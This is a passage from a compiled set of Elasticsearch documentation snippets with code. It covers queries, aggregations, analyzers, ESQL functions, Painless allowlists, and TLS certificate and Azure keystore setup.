OF THE POSSIBILITY OF SUCH DAMAGE.\n */\n```\n\n----------------------------------------\n\nTITLE: Indexing Data for kNN Search in Elasticsearch\nDESCRIPTION: Indexes sample image data and their associated vectors into an Elasticsearch index configured for kNN search. Dependencies include a pre-existing index with appropriate mappings. The inputs are bulk data in JSON format, and the output is successful data indexing ready for kNN queries.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-knn-query.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST my-image-index/_bulk?refresh=true\n{ \"index\": { \"_id\": \"1\" } }\n{ \"image-vector\": [1, 5, -20], \"file-type\": \"jpg\", \"title\": \"mountain lake\" }\n{ \"index\": { \"_id\": \"2\" } }\n{ \"image-vector\": [42, 8, -15], \"file-type\": \"png\", \"title\": \"frozen lake\"}\n{ \"index\": { \"_id\": \"3\" } }\n{ \"image-vector\": [15, 11, 23], \"file-type\": \"jpg\", \"title\": \"mountain lake lodge\" }\n\n```\n\n----------------------------------------\n\nTITLE: Non-recommended REST Endpoint URL Examples\nDESCRIPTION: Examples of REST endpoint patterns that should be avoided in Elasticsearch. These examples use plural nouns which go against the Elasticsearch convention of using singular nouns in URLs.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/CONTRIBUTING.md#2025-04-21_snippet_2\n\nLANGUAGE: text\nCODE:\n```\n/_ingest/pipelines\n/_ingest/pipelines/{id}\n```\n\n----------------------------------------\n\nTITLE: P-Value Score Implementation Example\nDESCRIPTION: Complete example of calculating p-value scores for terms with specific foreground and background filters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-significantterms-aggregation.md#2025-04-21_snippet_8\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"bool\": {\n      \"filter\": [\n        {\n          \"term\": {\n            \"event.outcome\": \"failure\"\n          }\n        },\n        {\n          \"range\": {\n            \"@timestamp\": {\n              \"gte\": \"2021-02-01\",\n              \"lt\": \"2021-02-04\"\n            }\n          }\n        },\n        {\n          \"term\": {\n            \"service.name\": {\n              \"value\": \"frontend-node\"\n            }\n          }\n        }\n      ]\n    }\n  },\n  \"aggs\": {\n    \"failure_p_value\": {\n      \"significant_terms\": {\n        \"field\": \"user_agent.version\",\n        \"background_filter\": {\n          \"bool\": {\n            \"must_not\": [\n              {\n                \"term\": {\n                  \"event.outcome\": \"failure\"\n                }\n              }\n            ],\n            \"filter\": [\n              {\n                \"range\": {\n                  \"@timestamp\": {\n                    \"gte\": \"2021-02-01\",\n                    \"lt\": \"2021-02-04\"\n                  }\n                }\n              },\n              {\n                \"term\": {\n                  \"service.name\": {\n                    \"value\": \"frontend-node\"\n                  }\n                }\n              }\n            ]\n          }\n        },\n        \"p_value\": {\"background_is_superset\": false, \"normalize_above\": 1000}\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Max Bucket Aggregation Response Example\nDESCRIPTION: Sample response showing the aggregation results including monthly sales buckets and the maximum monthly sales value with corresponding keys.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-max-bucket-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: console-result\nCODE:\n```\n{\n   \"took\": 11,\n   \"timed_out\": false,\n   \"_shards\": ...,\n   \"hits\": ...,\n   \"aggregations\": {\n      \"sales_per_month\": {\n         \"buckets\": [\n            {\n               \"key_as_string\": \"2015/01/01 00:00:00\",\n               \"key\": 1420070400000,\n               \"doc_count\": 3,\n               \"sales\": {\n                  \"value\": 550.0\n               }\n            },\n            {\n               \"key_as_string\": \"2015/02/01 00:00:00\",\n               \"key\": 1422748800000,\n               \"doc_count\": 2,\n               \"sales\": {\n                  \"value\": 60.0\n               }\n            },\n            {\n               \"key_as_string\": \"2015/03/01 00:00:00\",\n               \"key\": 1425168000000,\n               \"doc_count\": 2,\n               \"sales\": {\n                  \"value\": 375.0\n               }\n            }\n         ]\n      },\n      \"max_monthly_sales\": {\n          \"keys\": [\"2015/01/01 00:00:00\"],\n          \"value\": 550.0\n      }\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Simple Pattern Tokenizer in Elasticsearch\nDESCRIPTION: This code snippet demonstrates how to configure the simple pattern tokenizer in Elasticsearch to tokenize three-digit numbers. It sets up an index with an analyzer that uses this tokenizer and tests it using sample text. This configuration requires Elasticsearch with support for setting tokenizers and a basic understanding of index settings.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-simplepattern-tokenizer.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"my_analyzer\": {\n          \"tokenizer\": \"my_tokenizer\"\n        }\n      },\n      \"tokenizer\": {\n        \"my_tokenizer\": {\n          \"type\": \"simple_pattern\",\n          \"pattern\": \"[0123456789]{3}\"\n        }\n      }\n    }\n  }\n}\n\nPOST my-index-000001/_analyze\n{\n  \"analyzer\": \"my_analyzer\",\n  \"text\": \"fd-786-335-514-x\"\n}\n```\n\n----------------------------------------\n\nTITLE: Converting Single Value to Aggregate Metric Double in ESQL\nDESCRIPTION: This example shows how to convert a single long value to an aggregate_metric_double using the TO_AGGREGATE_METRIC_DOUBLE function. The result includes min, max, sum, and value_count properties for the input value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/to_aggregate_metric_double.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW x = 3892095203\n| EVAL agg_metric = TO_AGGREGATE_METRIC_DOUBLE(x)\n```\n\n----------------------------------------\n\nTITLE: Defining Debugging API in Painless\nDESCRIPTION: Defines a debugging class within the Painless scripting environment. The 'Debug' class includes an 'explain' method that accepts an Object parameter, providing facilities to explain or inspect an object's properties.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.txt#2025-04-21_snippet_1\n\nLANGUAGE: Painless\nCODE:\n```\nclass org.elasticsearch.painless.api.Debug {\n  void explain(Object)\n}\n\n```\n\n----------------------------------------\n\nTITLE: Response Format for Multi Terms Aggregation\nDESCRIPTION: Example response showing the structure of multi_terms aggregation results, including bucket keys as arrays, document counts, and error bounds.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-multi-terms-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  ...\n  \"aggregations\" : {\n    \"genres_and_products\" : {\n      \"doc_count_error_upper_bound\" : 0,  <1>\n      \"sum_other_doc_count\" : 0,          <2>\n      \"buckets\" : [                       <3>\n        {\n          \"key\" : [                       <4>\n            \"rock\",\n            \"Product A\"\n          ],\n          \"key_as_string\" : \"rock|Product A\",\n          \"doc_count\" : 2\n        },\n        {\n          \"key\" : [\n            \"electronic\",\n            \"Product B\"\n          ],\n          \"key_as_string\" : \"electronic|Product B\",\n          \"doc_count\" : 1\n        },\n        {\n          \"key\" : [\n            \"jazz\",\n            \"Product B\"\n          ],\n          \"key_as_string\" : \"jazz|Product B\",\n          \"doc_count\" : 1\n        },\n        {\n          \"key\" : [\n            \"rock\",\n            \"Product B\"\n          ],\n          \"key_as_string\" : \"rock|Product B\",\n          \"doc_count\" : 1\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: String Enclosure in Elasticsearch EQL\nDESCRIPTION: Demonstrates the correct way to enclose strings in Elasticsearch EQL using double quotes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-syntax.md#2025-04-21_snippet_35\n\nLANGUAGE: eql\nCODE:\n```\nprocess_name == \"example\"\n```\n\n----------------------------------------\n\nTITLE: Checking Data Stream Indices in Elasticsearch\nDESCRIPTION: This API call retrieves information about the indices in a specific data stream, filtered to show only index names.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/reindex-data-stream.md#2025-04-21_snippet_7\n\nLANGUAGE: console\nCODE:\n```\nGET _data_stream/my-data-stream?filter_path=data_streams.indices.index_name\n```\n\n----------------------------------------\n\nTITLE: Defining LongStream.Builder Interface in Painless - Java\nDESCRIPTION: Defines the LongStream.Builder class to facilitate the incremental building of a LongStream. It allows adding long elements progressively before constructing the stream.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.util.stream.txt#2025-04-21_snippet_7\n\nLANGUAGE: Java\nCODE:\n```\nclass java.util.stream.LongStream$Builder {\n  LongStream.Builder add(long)\n  LongStream build()\n}\n```\n\n----------------------------------------\n\nTITLE: Multiplexer Token Filter Analysis Result in Elasticsearch\nDESCRIPTION: This snippet shows the response from the _analyze API, demonstrating the output tokens produced by the multiplexer token filter. It includes original, lowercase, and stemmed versions of the input tokens.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-multiplexer-tokenfilter.md#2025-04-21_snippet_2\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"tokens\": [\n    {\n      \"token\": \"Going\",\n      \"start_offset\": 0,\n      \"end_offset\": 5,\n      \"type\": \"<ALPHANUM>\",\n      \"position\": 0\n    },\n    {\n      \"token\": \"going\",\n      \"start_offset\": 0,\n      \"end_offset\": 5,\n      \"type\": \"<ALPHANUM>\",\n      \"position\": 0\n    },\n    {\n      \"token\": \"go\",\n      \"start_offset\": 0,\n      \"end_offset\": 5,\n      \"type\": \"<ALPHANUM>\",\n      \"position\": 0\n    },\n    {\n      \"token\": \"HOME\",\n      \"start_offset\": 6,\n      \"end_offset\": 10,\n      \"type\": \"<ALPHANUM>\",\n      \"position\": 1\n    },\n    {\n      \"token\": \"home\",          <1>\n      \"start_offset\": 6,\n      \"end_offset\": 10,\n      \"type\": \"<ALPHANUM>\",\n      \"position\": 1\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Including MAX Function Supported Types in Markdown\nDESCRIPTION: This snippet includes the content of a markdown file containing the supported types for the MAX function.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/max.md#2025-04-21_snippet_2\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../types/max.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Creating an attachment pipeline for CBOR data\nDESCRIPTION: Example showing how to create an attachment processor pipeline intended for use with CBOR-encoded data instead of JSON.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/attachment.md#2025-04-21_snippet_6\n\nLANGUAGE: console\nCODE:\n```\nPUT _ingest/pipeline/cbor-attachment\n{\n  \"description\" : \"Extract attachment information\",\n  \"processors\" : [\n    {\n      \"attachment\" : {\n        \"field\" : \"data\",\n        \"remove_binary\": true\n      }\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Including Parameter Documentation for LOG Function\nDESCRIPTION: This snippet includes the parameter documentation for the LOG function from an external markdown file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/log.md#2025-04-21_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../parameters/log.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Basic Weighted Tokens Query in Elasticsearch\nDESCRIPTION: A basic example of using weighted tokens query against a query_expansion_field with token-weight pairs and optional pruning configuration to improve query performance.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-weighted-tokens-query.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\nPOST _search\n{\n  \"query\": {\n    \"weighted_tokens\": {\n      \"query_expansion_field\": {\n        \"tokens\": {\"2161\": 0.4679, \"2621\": 0.307, \"2782\": 0.1299, \"2851\": 0.1056, \"3088\": 0.3041, \"3376\": 0.1038, \"3467\": 0.4873, \"3684\": 0.8958, \"4380\": 0.334, \"4542\": 0.4636, \"4633\": 2.2805, \"4785\": 1.2628, \"4860\": 1.0655, \"5133\": 1.0709, \"7139\": 1.0016, \"7224\": 0.2486, \"7387\": 0.0985, \"7394\": 0.0542, \"8915\": 0.369, \"9156\": 2.8947, \"10505\": 0.2771, \"11464\": 0.3996, \"13525\": 0.0088, \"14178\": 0.8161, \"16893\": 0.1376, \"17851\": 1.5348, \"19939\": 0.6012},\n        \"pruning_config\": {\n          \"tokens_freq_ratio_threshold\": 5,\n          \"tokens_weight_threshold\": 0.4,\n          \"only_score_pruned_tokens\": false\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Year Methods and Fields\nDESCRIPTION: Lists the methods and fields available in the java.time.Year class. It focuses on methods for creating, parsing, and manipulating Year objects, including functionalities for comparing years, formatting, retrieving values, and performing arithmetic operations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.time.txt#2025-04-21_snippet_13\n\nLANGUAGE: java\nCODE:\n```\n\"class java.time.Year {\n  int MAX_VALUE\n  int MIN_VALUE\n  LocalDate atDay(int)\n  YearMonth atMonth(int)\n  LocalDate atMonthDay(MonthDay)\n  int compareTo(Year)\n  String format(DateTimeFormatter)\n  Year from(TemporalAccessor)\n  int getValue()\n  boolean isAfter(Year)\n  boolean isLeap()\n  boolean isLeap(long)\n  boolean isValidMonthDay(MonthDay)\n  int length()\n  Year minus(TemporalAmount)\n  Year minus(long,TemporalUnit)\n  Year minusYears(long)\n  Year of(int)\n  Year parse(CharSequence)\n  Year parse(CharSequence,DateTimeFormatter)\n  Year plus(TemporalAmount)\n  Year plus(long,TemporalUnit)\n  Year plusYears(long)\n  Year with(TemporalAdjuster)\n  Year with(TemporalField,long)\n}\"\n```\n\n----------------------------------------\n\nTITLE: Downloading and Importing Azure Account Settings\nDESCRIPTION: Commands to download and import Azure account settings to enable CLI authentication. This downloads a .publishsettings file and imports it to configure the CLI.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/discovery-azure-classic-long.md#2025-04-21_snippet_4\n\nLANGUAGE: sh\nCODE:\n```\n# This will open a browser and will download a .publishsettings file\nazure account download\n\n# Import this file (we have downloaded it to /tmp)\n# Note, it will create needed files in ~/.azure. You can remove azure.publishsettings when done.\nazure account import /tmp/azure.publishsettings\n```\n\n----------------------------------------\n\nTITLE: Geohex Grid Query with Bounds Parameter\nDESCRIPTION: Shows how to use the bounds parameter in geohex_grid aggregation to restrict cells to those intersecting with specified geographic bounds, independent of any geo_bounding_box query.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-geohexgrid-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPOST /museums/_search?size=0\n{\n  \"aggregations\": {\n    \"tiles-in-bounds\": {\n      \"geohex_grid\": {\n        \"field\": \"location\",\n        \"precision\": 12,\n        \"bounds\": {\n          \"top_left\": \"POINT (4.9 52.4)\",\n          \"bottom_right\": \"POINT (5.0 52.3)\"\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Interactive Program GPLv2 Notice (Generic)\nDESCRIPTION: This code shows an example of a short notice that an interactive program should output when it starts in interactive mode. It includes the program name, copyright information, warranty disclaimer, and instructions on how to access license details.  The `show w` and `show c` commands are placeholders for commands that display the warranty and copyright information, respectively.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-attachment/licenses/tika-parser-zip-commons-NOTICE.txt#2025-04-21_snippet_1\n\nLANGUAGE: Generic\nCODE:\n```\n    \"Gnomovision version 69, Copyright (C) year name of author\\n    Gnomovision comes with ABSOLUTELY NO WARRANTY; for details type\\n    `show w'. This is free software, and you are welcome to redistribute\\n    it under certain conditions; type `show c' for details.\"\n```\n\n----------------------------------------\n\nTITLE: Defining Custom Spanish Analyzer in Elasticsearch\nDESCRIPTION: This snippet configures a custom analyzer for the Spanish language in Elasticsearch. It utilizes filters for stopwords, keyword marking, and light stemming to process Spanish text inputs effectively. Ensure that Elasticsearch is properly set up with relevant language plugins for accurate results.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-lang-analyzer.md#2025-04-21_snippet_26\n\nLANGUAGE: console\nCODE:\n```\nPUT /spanish_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"filter\": {\n        \"spanish_stop\": {\n          \"type\":       \"stop\",\n          \"stopwords\":  \"_spanish_\" <1>\n        },\n        \"spanish_keywords\": {\n          \"type\":       \"keyword_marker\",\n          \"keywords\":   [\"ejemplo\"] <2>\n        },\n        \"spanish_stemmer\": {\n          \"type\":       \"stemmer\",\n          \"language\":   \"light_spanish\"\n        }\n      },\n      \"analyzer\": {\n        \"rebuilt_spanish\": {\n          \"tokenizer\":  \"standard\",\n          \"filter\": [\n            \"lowercase\",\n            \"spanish_stop\",\n            \"spanish_keywords\",\n            \"spanish_stemmer\"\n          ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Securing DocumentBuilderFactory Instantiation\nDESCRIPTION: Warns against direct usage of DocumentBuilderFactory and recommends using SamlUtils#getHardenedDocumentBuilder() method for secure XML document parsing\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/security/forbidden/xml-signatures.txt#2025-04-21_snippet_0\n\nLANGUAGE: java\nCODE:\n```\njavax.xml.parsers.DocumentBuilderFactory#newInstance()\n```\n\nLANGUAGE: java\nCODE:\n```\njavax.xml.parsers.DocumentBuilderFactory#newInstance(java.lang.String, java.lang.ClassLoader)\n```\n\n----------------------------------------\n\nTITLE: Non-Keyed Response Query\nDESCRIPTION: Query that returns percentiles as an array instead of a hash by setting keyed to false.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-percentile-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET latency/_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"load_time_outlier\": {\n      \"percentiles\": {\n        \"field\": \"load_time\",\n        \"keyed\": false\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: SQL Query for Geometry Type using ST_GEOMETRYTYPE\nDESCRIPTION: This SQL query selects points from a test table where the geometry type is 'POINT'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/sql/src/test/resources/org/elasticsearch/xpack/sql/planner/querytranslator_tests.txt#2025-04-21_snippet_20\n\nLANGUAGE: SQL\nCODE:\n```\nSELECT ST_AsWKT(point) FROM test WHERE ST_GEOMETRYTYPE(point) = 'POINT';\n```\n\n----------------------------------------\n\nTITLE: Defining FilterScript$Factory Class in Java\nDESCRIPTION: This snippet defines the 'FilterScript$Factory' class, which acts as a factory for creating instances of the FilterScript class. This factory pattern is commonly used in Java to encapsulate the instantiation logic. Like the previous class, it is designed for integration with the Elasticsearch scripting environment and requires no external dependencies.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.filter.txt#2025-04-21_snippet_1\n\nLANGUAGE: java\nCODE:\n```\nclass org.elasticsearch.script.FilterScript$Factory @no_import {\n}\n\n```\n\n----------------------------------------\n\nTITLE: Geohash-based Geo Sort in Elasticsearch\nDESCRIPTION: Example of geo-distance sorting using geohash format for location specification.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/sort-search-results.md#2025-04-21_snippet_15\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"sort\": [\n    {\n      \"_geo_distance\": {\n        \"pin.location\": \"drm3btev3e86\",\n        \"order\": \"asc\",\n        \"unit\": \"km\"\n      }\n    }\n  ],\n  \"query\": {\n    \"term\": { \"user\": \"kimchy\" }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Whitelisting Class for Field API in Painless\nDESCRIPTION: This snippet indicates the classes that need to be whitelisted for using ElasticSearch's Field API via Painless scripting. It ensures that the specified classes, `StringSortScript` and `StringSortScript$Factory`, are accessible and able to interact with the Field API effectively. This setup is essential for executing scripts that require these classes. The snippet assumes no imports are needed within this context.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.string_sort.txt#2025-04-21_snippet_0\n\nLANGUAGE: Painless\nCODE:\n```\nclass org.elasticsearch.script.StringSortScript @no_import {\n}\nclass org.elasticsearch.script.StringSortScript$Factory @no_import {\n}\n```\n\n----------------------------------------\n\nTITLE: ESQL Parameter Documentation for Slice Function\nDESCRIPTION: Defines three main parameters: field (multivalue expression), start (starting position with support for negative indices), and end (optional ending position, inclusive). Parameters support null values and negative indexing where -1 represents the last element.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/mv_slice.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n**Parameters**\n\n`field`\n:   Multivalue expression. If `null`, the function returns `null`.\n\n`start`\n:   Start position. If `null`, the function returns `null`. The start argument can be negative. An index of -1 is used to specify the last value in the list.\n\n`end`\n:   End position(included). Optional; if omitted, the position at `start` is returned. The end argument can be negative. An index of -1 is used to specify the last value in the list.\n```\n\n----------------------------------------\n\nTITLE: Generating Node Certificates Signed by CA for Elasticsearch\nDESCRIPTION: This snippet shows how to create new certificates for Elasticsearch nodes, signed by the previously created CA. It includes steps to generate the certificate, extract the public and private keys, and convert them to PKCS12 format.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/run.ssl/readme.md#2025-04-21_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nexport i=1 # update this\nrm -rf certificate-bundle.zip public-cert$i.pem private-cert$i.key private-cert$i.p12 instance\nbin/elasticsearch-certutil cert -ca-key private-ca.key -ca-cert public-ca.pem -days 7305 -pem -dns localhost,es$i -ip 127.0.0.1,::1\nunzip certificate-bundle.zip\nmv instance/instance.crt public-cert$i.pem\nmv instance/instance.key private-cert$i.key\nopenssl pkcs12 -export -out private-cert$i.p12 -inkey private-cert$i.key -in public-cert$i.pem -passout pass: #convert public/private key to p12\n```\n\n----------------------------------------\n\nTITLE: Defining Allowed Processor Methods for Painless Scripting in Java\nDESCRIPTION: Defines a class containing whitelisted static processor methods that can be called from Painless scripts. Methods include string operations (lowercase, uppercase), byte conversion, JSON processing, URL decoding, community ID generation, and URI parsing capabilities.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-common/src/main/resources/org/elasticsearch/ingest/common/processors_whitelist.txt#2025-04-21_snippet_0\n\nLANGUAGE: java\nCODE:\n```\nclass org.elasticsearch.ingest.common.Processors {\n  long bytes(String)\n  String lowercase(String)\n  String uppercase(String)\n  Object json(Object)\n  Object jsonLenient(Object)\n  void json(Map, String)\n  void jsonLenient(Map, String)\n  String urlDecode(String)\n  String communityId(String, String, Object, Object, Object, Object, Object, Object, int)\n  String communityId(String, String, Object, Object, Object, Object, Object, Object)\n  Map uriParts(String)\n}\n```\n\n----------------------------------------\n\nTITLE: Updating _meta Field in Existing Elasticsearch Index Mapping\nDESCRIPTION: This snippet shows how to update the _meta field of an existing Elasticsearch index using the update mapping API. It allows modification of custom metadata associated with the mapping type.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/mapping-meta-field.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001/_mapping\n{\n  \"_meta\": {\n    \"class\": \"MyApp2::User3\",\n    \"version\": {\n      \"min\": \"1.3\",\n      \"max\": \"1.5\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Date Histogram Aggregation with 28-Day Offset\nDESCRIPTION: Example response showing date histogram buckets with a 28-day offset, demonstrating how bucket dates shift across months.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-datehistogram-aggregation.md#2025-04-21_snippet_11\n\nLANGUAGE: console\nCODE:\n```\n\"buckets\": [\n  { \"key_as_string\": \"2021-12-29\", \"key\": 1640736000000, \"doc_count\": 1 },\n  { \"key_as_string\": \"2022-01-29\", \"key\": 1643414400000, \"doc_count\": 1 },\n  { \"key_as_string\": \"2022-03-01\", \"key\": 1646092800000, \"doc_count\": 1 },\n  { \"key_as_string\": \"2022-03-29\", \"key\": 1648512000000, \"doc_count\": 1 },\n  { \"key_as_string\": \"2022-04-29\", \"key\": 1651190400000, \"doc_count\": 1 },\n  { \"key_as_string\": \"2022-05-29\", \"key\": 1653782400000, \"doc_count\": 1 },\n  { \"key_as_string\": \"2022-06-29\", \"key\": 1656460800000, \"doc_count\": 1 },\n  { \"key_as_string\": \"2022-07-29\", \"key\": 1659052800000, \"doc_count\": 1 }\n]\n```\n\n----------------------------------------\n\nTITLE: Create Index Template for Data Stream\nDESCRIPTION: Creates an index template with data stream enabled for storing Windows event logs.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-ex-threat-detection.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT /_index_template/my-data-stream-template\n{\n  \"index_patterns\": [ \"my-data-stream*\" ],\n  \"data_stream\": { },\n  \"priority\": 500\n}\n```\n\n----------------------------------------\n\nTITLE: Converting IP Strings with Leading Zeros as Decimal in ESQL\nDESCRIPTION: Demonstrates parsing IPv4 addresses with leading zeros as decimal values using the 'leading_zeros' parameter set to 'decimal'. This matches Java's InetAddress.getByName behavior.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/to_ip.md#2025-04-21_snippet_2\n\nLANGUAGE: esql\nCODE:\n```\nROW s = \"1.1.010.1\" | EVAL ip = TO_IP(s, {\"leading_zeros\":\"decimal\"})\n```\n\n----------------------------------------\n\nTITLE: Creating Azure Keystore for Plugin Authentication\nDESCRIPTION: Commands to create a PKCS12 keystore that will be used by the Azure Discovery plugin to authenticate API calls. This involves converting keys to PEM format and creating a password-protected keystore.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/discovery-azure-classic-long.md#2025-04-21_snippet_1\n\nLANGUAGE: sh\nCODE:\n```\n# Generate a keystore (azurekeystore.pkcs12)\n# Transform private key to PEM format\nopenssl pkcs8 -topk8 -nocrypt -in azure-private.key -inform PEM -out azure-pk.pem -outform PEM\n# Transform certificate to PEM format\nopenssl x509 -inform der -in azure-certificate.cer -out azure-cert.pem\ncat azure-cert.pem azure-pk.pem > azure.pem.txt\n# You MUST enter a password!\nopenssl pkcs12 -export -in azure.pem.txt -out azurekeystore.pkcs12 -name azure -noiter -nomaciter\n```\n\n----------------------------------------\n\nTITLE: Defining LocalTime Class\nDESCRIPTION: This code snippet defines the `java.time.LocalTime` class, outlining methods for working with time values without timezone information. These methods cover creation, manipulation (plus/minus hours, minutes, seconds, nanos), component extraction, formatting, parsing, and comparisons.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.time.txt#2025-04-21_snippet_7\n\nLANGUAGE: Java\nCODE:\n```\n\"class java.time.LocalTime {\\n  LocalTime MAX\\n  LocalTime MIDNIGHT\\n  LocalTime MIN\\n  LocalTime NOON\\n  LocalDateTime atDate(LocalDate)\\n  OffsetTime atOffset(ZoneOffset)\\n  int compareTo(LocalTime)\\n  String format(DateTimeFormatter)\\n  LocalTime from(TemporalAccessor)\\n  int getHour()\\n  int getMinute()\\n  int getNano()\\n  int getSecond()\\n  boolean isAfter(LocalTime)\\n  boolean isBefore(LocalTime)\\n  LocalTime minus(TemporalAmount)\\n  LocalTime minus(long,TemporalUnit)\\n  LocalTime minusHours(long)\\n  LocalTime minusMinutes(long)\\n  LocalTime minusNanos(long)\\n  LocalTime minusSeconds(long)\\n  LocalTime of(int,int)\\n  LocalTime of(int,int,int)\\n  LocalTime of(int,int,int,int)\\n  LocalTime ofNanoOfDay(long)\\n  LocalTime ofSecondOfDay(long)\\n  LocalTime parse(CharSequence)\\n  LocalTime parse(CharSequence,DateTimeFormatter)\\n  LocalTime plus(TemporalAmount)\\n  LocalTime plus(long,TemporalUnit)\\n  LocalTime plusHours(long)\\n  LocalTime plusMinutes(long)\\n  LocalTime plusNanos(long)\\n  LocalTime plusSeconds(long)\\n  long toNanoOfDay()\\n  int toSecondOfDay()\\n  LocalTime truncatedTo(TemporalUnit)\\n  LocalTime with(TemporalAdjuster)\\n  LocalTime with(TemporalField,long)\\n  LocalTime withHour(int)\\n  LocalTime withMinute(int)\\n  LocalTime withNano(int)\\n  LocalTime withSecond(int)\\n}\"\n```\n\n----------------------------------------\n\nTITLE: Including BUCKET Function Description in Markdown\nDESCRIPTION: This snippet includes the description section for the BUCKET function from an external markdown file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/bucket.md#2025-04-21_snippet_2\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../description/bucket.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Using Pre-Decrement Operator with 'def' Type in Painless\nDESCRIPTION: This example illustrates how the pre-decrement operator '--' functions with the 'def' type in Painless, showing implicit casting and type handling.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-numeric.md#2025-04-21_snippet_7\n\nLANGUAGE: painless\nCODE:\n```\ndef x = 